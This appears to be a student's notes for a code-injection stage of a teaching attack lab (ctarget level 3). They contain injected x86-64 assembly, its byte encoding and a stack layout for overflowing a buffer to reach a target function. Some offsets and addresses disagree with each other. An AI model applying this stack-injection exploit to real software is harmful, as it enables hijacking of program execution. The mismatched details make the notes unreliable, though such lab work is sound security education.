# code to be injected into ctarget level 3
    movq    $0x5561dca8, %rdi       # address of cookie string
    pushq   $0x4018fa               # push address of touch3 onto stack
    ret


# Byte representation of above assembly code:
# - assemble above code: gcc -c ctarget.l3.code.s  => creates ctarget.l3.code.o
# - disassemble it: objdump -d ctarget.l3.codeinjection.s

ctarget.l3.code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   b:	68 fa 18 40 00       	pushq  $0x4018fa
  10:	c3                   	retq   




# Stack structure:
# [larger addr]
#    cookie string (9 bytes)            => this is above the original return address
#                                       => so it's actually in stack frame for test
#               => we place cookie here so that the allocation of stack frame for
#                  hexmatch does not overwrite it.
#    address of mov (or address of touch3 after push below)
#                                       => this overwrites original return address
#    random stuff (27 bytes)
#    ret (1 byte)
#    push 0x4018fa (5 bytes)            => push address of touch3 to stack
#    mov 0x5561dc97,%rdi (7 bytes)      => store address of cookie string to %rdi
# [top of stack - smaller addr]

# Note that instructions on the stack get executed "upward", i.e. with increasing address.
